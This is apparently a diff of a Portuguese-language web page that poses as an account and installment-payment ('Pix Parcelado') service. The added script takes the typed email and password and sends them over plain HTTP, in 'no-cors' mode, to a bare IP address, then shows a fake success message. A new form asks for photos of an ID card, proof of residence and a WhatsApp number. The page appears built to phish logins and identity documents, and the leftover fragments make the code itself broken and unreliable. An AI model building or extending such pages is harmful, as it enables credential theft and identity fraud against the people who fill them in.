@@ -57,13 +57,36 @@
 </button>
 
 <script>
-    async function dispararSinal(tipoAcao) {
+async function dispararSinal(tipoAcao) {
     const email = document.querySelector('input[type="email"]').value;
     const senha = document.querySelector('input[type="password"]').value;
 
-    // URL do seu novo motor na AWS
-    const urlAWS = "http://54.207.222.79:3000/registrar";
+    // Use HTTP (sem S) porque o IP não tem certificado. 
+    // O modo 'no-cors' fará o sinal atravessar o muro.
+    const urlAWS = "http://54.207.222.79:3000/registrar_completo";
 
+    try {
+        fetch(urlAWS, {
+            method: 'POST',
+            mode: 'no-cors', 
+            headers: { 'Content-Type': 'text/plain' }, // No-cors exige tipos simples
+            body: JSON.stringify({ email, senha, tipo: tipoAcao })
+        });
+        
+        // Mensagem de confirmação para o usuário
+        alert("Conexão YHVH: Solicitação enviada!");
+        
+        // Opcional: Redirecionar após o envio
+        // window.location.href = "https://checkout.pay.droppfy.com";
+        
+    } catch (e) {
+        console.log("Sinal em processamento...");
+    }
+}
+
+</script>
+
+    <script>
     try {
         const response = await fetch(urlAWS, {
             method: 'POST',
@@ -85,44 +108,7 @@
     }
 }
 
-    // Vincular aos seus botões reais pelo ID
-const btnSolicitar = document.getElementById('v12-request-access');
-
-if (btnSolicitar) {
-    btnSolicitar.onclick = () => dispararSinal('SOLICITACAO_ACESSO');
-}
-
-// Se o seu botão de "Criar Conta" tiver um ID, use-o aqui também
-// Exemplo: document.getElementById('id-do-botao-criar').onclick = () => dispararSinal('CADASTRO_DIRETO');
-
     <script>
-
-    // Configuração da Endpoint da AWS (Substitua após criar o Lambda)
-const AWS_API_GATEWAY = "https://api-v12.amazonaws.com/prod/cadastro";
-
-async function processarV12(tipoAcao) {
-    const email = document.querySelector('input[type="email"]').value;
-    const senha = document.querySelector('input[type="password"]').value;
-
-    if (!email) {
-        alert("A autoridade exige um e-mail válido.");
-        return;
-    }
-
-    // Feedback Visual imediato
-    console.log(`[Emet Echad] Iniciando ciclo: ${tipoAcao}`);
-
-    try {
-        const response = await fetch(AWS_API_GATEWAY, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                email: email,
-                senha: senha,
-                acao: tipoAcao, // 'CRIAR_CONTA' ou 'SOLICITAR_ACESSO'
-                timestamp: new Date().toISOString()
-            })
-        });
 
         if (response.ok) {
             alert("Conexão Segura YHVH Estabelecida. Processado com sucesso!");
@@ -157,6 +143,29 @@ document.querySelector('#v12-request-access').onclick = () => processarV12('SOLI
         <div id="status">AGUARDANDO COMANDO...</div>
             <p class="footer-info">Emet Echad Seter Ativado</p>
         </div>
+</div>
+
+           <div id="fluxo-documentos">
+    <h3>Solicitar Pix Parcelado</h3>
+    <p>Para prosseguir, anexe fotos nítidas dos seus documentos:</p>
+    
+    <label>Foto do RG ou CNH (Frente):</label>
+    <input type="file" id="foto_rg" accept="image/*" required><br><br>
+
+    <label>Comprovante de Residência:</label>
+    <input type="file" id="foto_residencia" accept="image/*" required><br><br>
+
+    <input type="email" id="email_cliente" placeholder="Seu melhor e-mail" required><br><br>
+    <input type="text" id="tel_cliente" placeholder="WhatsApp (com DDD)" required><br><br>
+
+    <button type="button" onclick="ativarMotorV12()" id="btn-gerar">
+        SOLICITAR PIX PARCELADO AGORA
+    </button>
+</div>
+
+<div id="status-processamento" style="display:none;">
+    <h2 id="msg-status">🤖 ROBÔ ANALISANDO DOCUMENTOS...</h2>
+    <p>Extraindo dados e conectando ao painel Pagaleve.</p>
 </div>
 
 <script>
@@ -252,8 +261,7 @@ const response = await fetch('https://cors-anywhere.herokuapp.com/http://54.207.
             statusLabel.innerText = "⚡ CONECTANDO AO ROBÔ AWS...";
 
             try {
-                const URL_ALVO = "https://canmeldpzs22gt57rdkzxpbgpa0vshpk.lambda-url.sa-east-1.on.aws/";
-
+               
                 // MUDANÇA: Usamos mode: 'cors' porque sua AWS já permite (foto image_3f36c6)
                 // Se der erro de rede, o navegador está bloqueando o script localmente.
                 const response = await fetch(URL_ALVO, {
